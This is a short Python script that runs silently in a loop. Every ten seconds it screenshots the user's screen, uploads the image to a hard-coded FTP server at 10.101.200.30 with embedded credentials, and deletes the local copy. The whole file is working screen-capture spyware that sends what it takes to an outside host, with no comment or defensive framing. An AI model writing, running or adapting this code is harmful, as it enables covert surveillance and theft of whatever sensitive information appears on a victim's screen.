import os
import time
import ftplib
import datetime
import pyautogui as gui

def sendOverFTP(filename):
    t = datetime.datetime.fromtimestamp(time.time()).strftime('%Y-%m-%d %H:%M:%S')
    session = ftplib.FTP('10.101.200.30','parrot','pa$$')
    file = open(filename,'rb')
    session.storbinary('STOR ' + t, file)
    file.close()
    return filename

def snap(filename):
    pic = gui.screenshot()
    pic.save(filename)
    return filename

def main():
    filename = 'screen.png'
    while True:
        os.system('del ' + sendOverFTP(snap(filename)))
        time.sleep(10)

main()
